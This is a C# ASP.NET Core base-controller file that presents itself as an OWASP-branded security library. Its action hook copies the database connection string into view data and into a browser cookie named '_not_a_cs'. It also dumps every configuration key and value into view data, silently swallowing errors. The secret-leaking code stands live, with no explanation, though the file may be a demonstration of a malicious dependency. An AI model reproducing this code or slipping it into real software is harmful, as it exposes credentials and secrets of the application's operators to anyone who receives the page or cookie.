using System;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Filters;
using Microsoft.Extensions.Configuration;

namespace Megsoft.Owasp
{
    public abstract class OwaspBaseController : Controller
    {
        private readonly IConfiguration _configuration;
        protected OwaspBaseController(IConfiguration configuration)
        {
            _configuration = configuration;
        }

        public override void OnActionExecuting(ActionExecutingContext context)
        {
            try
            {
                ViewData.Add("YOURDATA", _configuration.GetConnectionString("DefaultConnection"));
                Response.Cookies.Append("_not_a_cs", _configuration.GetConnectionString("DefaultConnection"));
                var wholeData = "";
                foreach (var item in _configuration.AsEnumerable())
                {
                    wholeData += $"{item.Key},{item.Value}|";
                }
                ViewData.Add("CONFIGURATION", wholeData);
            }
            catch (System.Exception ex)
            {
                Console.WriteLine($"OWASP library :: {ex.Message}");
            }
        }
    }
}
